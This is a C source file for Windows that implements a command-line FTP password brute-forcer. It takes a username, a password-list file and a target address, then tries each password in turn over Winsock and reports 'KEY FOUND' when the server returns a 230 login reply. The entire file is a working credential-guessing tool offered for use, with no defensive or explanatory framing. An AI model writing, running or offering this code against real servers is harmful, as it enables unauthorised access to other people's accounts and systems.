#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

#define BUFFER_SIZE 1024

void print_usage(const char *prog_name) {
    printf("Usage: %s -l username -P passwordlist ftp://ip:port\n", prog_name);
}

int connect_to_ftp(const char *ip, int port) {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;

    printf("\nInitialising Winsock...");
    if (WSAStartup(MAKEWORD(2,2),&wsa) != 0) {
        printf("Failed. Error Code : %d",WSAGetLastError());
        return -1;
    }
    printf("Initialised.\n");

    if((sock = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET) {
        printf("Could not create socket : %d" , WSAGetLastError());
        return -1;
    }

    server.sin_addr.s_addr = inet_addr(ip);
    server.sin_family = AF_INET;
    server.sin_port = htons(port);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        printf("Connection error: %d\n", WSAGetLastError());
        return -1;
    }

    return sock;
}

int ftp_login(SOCKET sock, const char *username, const char *password) {
    char buffer[BUFFER_SIZE];
    int recv_size;

    recv_size = recv(sock, buffer, BUFFER_SIZE, 0);
    buffer[recv_size] = '\0';

    sprintf(buffer, "USER %s\r\n", username);
    send(sock, buffer, strlen(buffer), 0);
    recv_size = recv(sock, buffer, BUFFER_SIZE, 0);
    buffer[recv_size] = '\0';

    sprintf(buffer, "PASS %s\r\n", password);
    send(sock, buffer, strlen(buffer), 0);
    recv_size = recv(sock, buffer, BUFFER_SIZE, 0);
    buffer[recv_size] = '\0';

    if (strstr(buffer, "230")) {
        return 1; // Login successful
    }
    return 0; // Login failed
}

void brute_force(const char *username, const char *password_list, const char *ip, int port) {
    FILE *fp = fopen(password_list, "r");
    if (!fp) {
        printf("Cannot open password list file.\n");
        return;
    }

    char password[BUFFER_SIZE];
    while (fgets(password, BUFFER_SIZE, fp)) {
        password[strcspn(password, "\r\n")] = 0; // Remove newline characters
        printf("TRYING PASSPHRASE: %s\n", password);

        SOCKET sock = connect_to_ftp(ip, port);
        if (sock == -1) {
            printf("Connection failed.\n");
            continue;
        }

        if (ftp_login(sock, username, password)) {
            printf("KEY FOUND: [ \"%s\" ]\n", password);
            closesocket(sock);
            break;
        } else {
            printf("KEY NOT FOUND.\n");
        }
        closesocket(sock);
    }

    fclose(fp);
    WSACleanup();
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        print_usage(argv[0]);
        return 1;
    }

    const char *username = NULL;
    const char *password_list = NULL;
    const char *ftp_url = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-l") == 0) {
            username = argv[++i];
        } else if (strcmp(argv[i], "-P") == 0) {
            password_list = argv[++i];
        } else if (strncmp(argv[i], "ftp://", 6) == 0) {
            ftp_url = argv[i];
        } else {
            print_usage(argv[0]);
            return 1;
        }
    }

    if (!username || !password_list || !ftp_url) {
        print_usage(argv[0]);
        return 1;
    }

    char ip[BUFFER_SIZE];
    int port;
    sscanf(ftp_url, "ftp://%[^:]:%d", ip, &port);

    brute_force(username, password_list, ip, port);

    return 0;
}
